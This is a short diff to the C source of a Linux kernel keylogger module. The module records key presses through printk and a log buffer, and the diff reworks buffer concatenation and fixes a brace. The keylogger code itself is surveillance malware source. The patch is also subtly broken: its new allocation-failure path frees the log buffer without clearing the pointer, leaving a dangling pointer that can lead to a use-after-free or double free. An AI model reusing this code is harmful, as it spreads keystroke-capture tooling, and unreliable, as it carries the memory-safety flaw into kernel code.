@@ -40,15 +40,18 @@ static int add_new_entry(char *entry)
 	char *tmp_buff;
 	if (!(tmp_buff = vmalloc((keylogger_data.log_buffer ? strlen(entry) + strlen(keylogger_data.log_buffer) + 1 : strlen(entry) + 1))))
 	{
+		if (keylogger_data.log_buffer)
+			vfree(keylogger_data.log_buffer);
 		printk(KERN_ERR "Failed to allocate memory for new log entry\n");
 		return (1);
 	}
 	tmp_buff[0] = '\0';
 	if (keylogger_data.log_buffer)
+	{
 		strcpy(tmp_buff, keylogger_data.log_buffer);
-	strcat(tmp_buff, entry);
-	if (keylogger_data.log_buffer)
 		vfree(keylogger_data.log_buffer);
+	}
+	strcat(tmp_buff, entry);
 	keylogger_data.log_buffer = tmp_buff;
 	return (0);
 }
@@ -98,7 +101,7 @@ void	singlecode_handle(int scancode, struct key_info *key)
 	{
 		key = &scancode_to_key[scancode - 0x80];
 		printk(KERN_INFO "Key released:'%s' with ascii value(%d)\n", key->name, key->ascii);
-		}
+	}
 
 }
 
